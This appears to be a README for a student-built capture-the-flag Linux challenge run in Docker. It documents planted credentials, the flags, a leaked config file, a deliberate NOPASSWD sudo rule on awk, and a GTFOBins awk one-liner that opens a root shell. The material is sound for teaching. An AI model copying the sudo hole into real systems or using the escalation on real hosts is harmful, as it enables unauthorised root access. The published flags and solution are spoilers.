# Stage 6 - SC-LIN-01 : "Root of the Collective"

Linux / System Security capstone. Implements the spec in Section 5.6 of the
Assignment 01 report (Bandara W.M.A.M. / IT24103611, Challenge Design B).

## What's in this box

| Item | Value |
|---|---|
| Exposed port | `2222/tcp` → container `22` (SSH only) |
| Low-priv account | `analyst` / `N3st-Acc3ss_2026` |
| Mid-stage flag | `~/flag_mid.txt` in `analyst`'s home → `SHADOW{midroot_4fbbf6}` |
| Leaked config | `/opt/shadowcollective/sync/db_sync.conf` (world-readable, 644) |
| Second account | `operative` / `Gh0st_Proto-99!` (password lives in the config above) |
| Sudo misconfig | `operative ALL=(root) NOPASSWD: /usr/bin/awk` (GTFOBins) |
| Final flag | `/root/flag.txt`, mode `400` → `SHADOW{root_c12f14}` |

In the full box, `analyst`'s password is what Stage 5 (malware config
decoding) hands the player. Since Stages 3 and 5 aren't built yet, this
credential is fixed/documented above so the box is independently testable
right now, exactly as Section 8's "known-good cheat credential set" describes.
Swap it for whatever Stage 5 actually outputs once that stage exists.

## Intended solve path

1. `ssh analyst@<host> -p 2222` with the password above.
2. Read `~/flag_mid.txt` → mid-stage flag.
3. Enumerate the filesystem (LinPEAS, or just `find / -perm -o+r -type f 2>/dev/null`
   style manual poking) → find `/opt/shadowcollective/sync/db_sync.conf` →
   leaks `operative`'s password.
4. `su operative`.
5. `sudo -l` → shows `/usr/bin/awk` is runnable as root, no password.
6. GTFOBins escalation: `sudo awk 'BEGIN {system("/bin/sh")}'` → root shell.
7. `cat /root/flag.txt` → final flag.

## Running it

```bash
cd stage6-linux
docker compose up -d --build
```

Then:

```bash
ssh analyst@localhost -p 2222
# password: N3st-Acc3ss_2026
```

To confirm the whole chain without playing it by hand, run the bundled
solver (needs `sshpass`):

```bash
chmod +x solve_stage6.sh
./solve_stage6.sh localhost 2222
```

## Reset

Matches the "golden snapshot" reset model in Section 7.3 — this container
has no persistent volumes, so tearing it down and recreating it restores the
exact seeded state (new SSH host keys included):

```bash
docker compose down
docker compose up -d --build --force-recreate
```

## Isolation / security notes (Section 6.4 checklist)

- Container sits on its own dedicated Docker network. True no-egress
  isolation (Section 6.4) needs a host-level firewall rule rather than
  Docker's `internal: true` flag, since that flag also blocks the NAT rules
  the `ports:` mapping needs — see the comment in `compose.yaml`.
- Only port 22 is exposed, and only to `analyst`/`operative`
  (`AllowUsers` in `sshd_config`).
- `PermitRootLogin no`, `AllowTcpForwarding no`, `X11Forwarding no`.
- The only sudo rule on the box is the single intentional one above — no
  other privilege-escalation paths were added.
- `/root/flag.txt` is `chmod 400`, owned by root, so it's unreadable by
  anyone except root even if `operative` is compromised without the sudo
  step.

## Wiring into the main stack (optional, when ready)

This stage is self-contained, the same way `stage1-osint/` is, rather than
baked into the top-level `docker-compose.yml` (which only runs CTFd itself).
When Jayasundara integrates everything, either:

- keep it as a separate `docker compose -f stage6-linux/compose.yaml up -d`
  deployed alongside the others, or
- append the `stage6-linux` service block into the root `docker-compose.yml`
  and point CTFd's Stage 6 challenge description at whatever host/port it
  ends up on for players.
